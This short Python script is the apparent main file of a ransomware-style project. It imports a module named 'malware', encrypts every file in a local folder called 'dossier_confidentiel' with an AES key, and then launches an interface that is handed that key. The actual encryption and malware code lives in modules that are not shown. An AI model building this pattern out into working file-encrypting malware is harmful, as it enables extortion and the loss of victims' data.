import aes
import malware
from interface import Main
def main(): 
    folder = aes.read_folder("./dossier_confidentiel")
    aes.encrypt_folder(folder, aes.key)
    Main(aes.key)


if __name__ == "__main__":
    main()